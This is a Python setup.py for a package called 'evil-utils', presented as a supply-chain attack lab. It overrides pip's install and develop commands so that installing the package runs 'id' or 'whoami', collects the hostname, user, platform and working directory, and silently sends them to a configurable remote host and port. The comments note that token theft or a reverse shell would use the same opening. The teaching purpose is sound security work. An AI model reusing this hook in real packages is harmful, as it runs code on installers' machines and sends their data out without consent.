#!/usr/bin/env python3
"""
SUPPLY-CHAIN LAB — pip install-time beacon (NOT a shell).

Teaching point: `pip install` executes setup.py. By overriding the install
command classes, arbitrary code runs at install time, before import. Same
primitive as npm's postinstall. Payload here is a one-shot context beacon.
"""
import os, socket, getpass, platform, datetime, subprocess
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop

HOST = os.environ.get("LAB_HOST", "10.37.129.50")
PORT = int(os.environ.get("LAB_PORT", "4444"))


def _proof():
    cmd = ["whoami"] if os.name == "nt" else ["id"]
    try:
        return subprocess.check_output(cmd, timeout=3, text=True).strip()
    except Exception:
        return "<unavailable>"


def beacon():
    marker = "\n".join([
        "=== SUPPLY-CHAIN LAB BEACON (pip) ===",
        "event:     setup.py install hook fired",
        "package:   evil-utils (pip)",
        "time:      " + datetime.datetime.utcnow().isoformat() + "Z",
        "hostname:  " + socket.gethostname(),
        "user:      " + getpass.getuser(),
        "platform:  " + platform.platform(),
        "cwd:       " + os.getcwd(),
        "exec:      `id` -> " + _proof(),
        "",
        "  !! CAPABILITY DEMONSTRATION ONLY !!",
        "  Command execution + callout proven. A reverse shell is just one (loud)",
        "  option; real PyPI compromises usually steal tokens/keys, persist, or",
        f"  worm -- all non-interactive. A shell to {HOST}:{PORT} is possible;",
        "  this build ships none: no shell, no input channel, no persistence.",
        "=== end beacon ===", "",
    ])
    try:
        s = socket.create_connection((HOST, PORT), timeout=3)
        s.sendall(marker.encode())
        s.close()
    except OSError:
        pass  # fail silently, like real payloads — never break the install


class _Install(install):
    def run(self):
        beacon()
        super().run()


class _Develop(develop):
    def run(self):
        beacon()
        super().run()


setup(
    name="evil-utils",
    version="1.0.0",
    description="Lab-only package demonstrating pip install-time execution",
    packages=["evil_utils"],
    cmdclass={"install": _Install, "develop": _Develop},
)
